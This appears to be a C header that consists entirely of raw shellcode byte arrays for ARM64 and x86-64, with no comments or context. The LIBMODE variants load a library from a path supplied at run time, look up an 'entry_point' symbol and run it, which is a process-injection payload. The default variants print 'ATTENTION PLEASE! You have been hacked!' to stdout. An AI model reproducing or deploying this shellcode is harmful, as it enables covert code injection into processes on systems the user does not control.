#ifdef LIBMODE
    #ifdef __ARM_ARCH
        unsigned const char shellcode[] = {0xff, 0x3, 0x4, 0xd1, 0xfe, 0x7, 0x0, 0xf9, 0xe1, 0xb, 0x0, 0xf9, 0xe2, 0xf, 0x0, 0xf9, 0xe3, 0x13, 0x0, 0xf9, 0xe4, 0x17, 0x0, 0xf9, 0xe5, 0x1b, 0x0, 0xf9, 0xe6, 0x1f, 0x0, 0xf9, 0xe8, 0x23, 0x0, 0xf9, 0xfd, 0x27, 0x0, 0xf9, 0x22, 0x0, 0x0, 0x94, 0xfe, 0x2b, 0x0, 0xf9, 0xe6, 0x3, 0x1e, 0xaa, 0xe0, 0x3, 0x6, 0xaa, 0x0, 0x60, 0x0, 0x91, 0x21, 0x0, 0x80, 0xd2, 0xfd, 0x3, 0x0, 0x91, 0xbd, 0x7, 0x40, 0xd1, 0xc8, 0x0, 0x40, 0xf9, 0x0, 0x1, 0x3f, 0xd6, 0x1f, 0x0, 0x0, 0xf1, 0x80, 0x1, 0x0, 0x54, 0x4, 0x0, 0x0, 0x94, 0x65, 0x6e, 0x74, 0x72, 0x79, 0x5f, 0x70, 0x6f, 0x69, 0x6e, 0x74, 0x0, 0xe1, 0x3, 0x1e, 0xaa, 0xe6, 0x2b, 0x40, 0xf9, 0xc8, 0x4, 0x40, 0xf9, 0x0, 0x1, 0x3f, 0xd6, 0x1f, 0x0, 0x0, 0xf1, 0x40, 0x0, 0x0, 0x54, 0x0, 0x0, 0x3f, 0xd6, 0xfe, 0x7, 0x40, 0xf9, 0xe1, 0xb, 0x40, 0xf9, 0xe2, 0xf, 0x40, 0xf9, 0xe3, 0x13, 0x40, 0xf9, 0xe4, 0x17, 0x40, 0xf9, 0xe5, 0x1b, 0x40, 0xf9, 0xe6, 0x1f, 0x40, 0xf9, 0xe8, 0x23, 0x40, 0xf9, 0xfd, 0x27, 0x40, 0xf9, 0xff, 0x3, 0x4, 0x91, 0xc0, 0x3, 0x5f, 0xd6, 0xdf, 0xff, 0xff, 0x97};
    #else
        unsigned const char shellcode[] = {0x50, 0x53, 0x51, 0x52, 0x57, 0x56, 0x55, 0xeb, 0x5b, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xd2, 0x5b, 0x48, 0x89, 0xdf, 0x48, 0x83, 0xc7, 0x18, 0x48, 0x31, 0xf6, 0x48, 0xff, 0xc6, 0x48, 0x89, 0xe5, 0x48, 0x81, 0xed, 0x0, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xb, 0xff, 0xd1, 0x48, 0x85, 0xc0, 0x74, 0x28, 0xe8, 0xc, 0x0, 0x0, 0x0, 0x65, 0x6e, 0x74, 0x72, 0x79, 0x5f, 0x70, 0x6f, 0x69, 0x6e, 0x74, 0x0, 0x5e, 0x48, 0x89, 0xc7, 0x48, 0x89, 0xd9, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x8b, 0x9, 0xff, 0xd1, 0x48, 0x85, 0xc0, 0x74, 0x2, 0xff, 0xd0, 0x5d, 0x5e, 0x5f, 0x5a, 0x59, 0x5b, 0x58, 0xc3, 0xe8, 0xa0, 0xff, 0xff, 0xff};
    #endif
#else
    #ifdef __ARM_ARCH
        unsigned const char shellcode[] = {0xe1, 0x3, 0x1f, 0xf8, 0xe2, 0x83, 0x1e, 0xf8, 0xe3, 0x3, 0x1e, 0xf8, 0xe4, 0x83, 0x1d, 0xf8, 0xe8, 0x3, 0x1d, 0xf8, 0xe4, 0x3, 0x1e, 0xaa, 0x18, 0x0, 0x0, 0x94, 0xa, 0xa, 0x41, 0x54, 0x54, 0x45, 0x4e, 0x54, 0x49, 0x4f, 0x4e, 0x20, 0x50, 0x4c, 0x45, 0x41, 0x53, 0x45, 0x21, 0x20, 0x59, 0x6f, 0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x62, 0x65, 0x65, 0x6e, 0x20, 0x68, 0x61, 0x63, 0x6b, 0x65, 0x64, 0x21, 0xa, 0xa, 0xa, 0x20, 0x0, 0x80, 0xd2, 0xe1, 0x3, 0x3, 0xaa, 0x82, 0x5, 0x80, 0xd2, 0x8, 0x8, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xfe, 0x3, 0x4, 0xaa, 0xe1, 0x3, 0x5f, 0xf8, 0xe2, 0x83, 0x5e, 0xf8, 0xe3, 0x3, 0x5e, 0xf8, 0xe4, 0x83, 0x5d, 0xf8, 0xe8, 0x3, 0x5d, 0xf8, 0xc0, 0x3, 0x5f, 0xd6, 0xe3, 0x3, 0x1e, 0xaa, 0xf3, 0xff, 0xff, 0x97 };
    #else
        unsigned const char shellcode[] = {0x50, 0x57, 0x56, 0x52, 0xeb, 0x2b, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xd2, 0xb0, 0x1, 0x48, 0xff, 0xc7, 0x5e, 0xb2, 0x2c, 0xf, 0x5, 0x6a, 0x0, 0x6a, 0x1, 0x48, 0x89, 0xe7, 0xb8, 0x23, 0x0, 0x0, 0x0, 0x48, 0x31, 0xf6, 0xf, 0x5, 0x58, 0x58, 0x5a, 0x5e, 0x5f, 0x58, 0xc3, 0xe8, 0xd0, 0xff, 0xff, 0xff, 0xa, 0xa, 0x41, 0x54, 0x54, 0x45, 0x4e, 0x54, 0x49, 0x4f, 0x4e, 0x20, 0x50, 0x4c, 0x45, 0x41, 0x53, 0x45, 0x21, 0x20, 0x59, 0x6f, 0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x62, 0x65, 0x65, 0x6e, 0x20, 0x68, 0x61, 0x63, 0x6b, 0x65, 0x64, 0x21, 0xa, 0xa, 0xa };
    #endif
#endif
